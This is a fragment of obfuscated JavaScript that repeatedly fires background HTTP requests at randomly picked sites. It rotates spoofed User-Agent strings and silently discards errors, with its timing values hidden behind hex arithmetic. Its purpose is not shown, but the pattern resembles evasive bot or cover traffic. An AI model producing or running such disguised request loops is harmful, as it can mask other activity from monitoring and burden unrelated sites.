    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x266d + -0x25b4 + 0x6779) * getRandomInt(0xb * 0x4c + 0x1361 * 0x1 + 0x3 * -0x78c, 0x2 * -0x12a1 + 0x5 * -0x127 + 0x2 * 0x1585));
}, 0x1be7 * 0x1 + -0x528 * 0x6 + 0x36d * 0x1);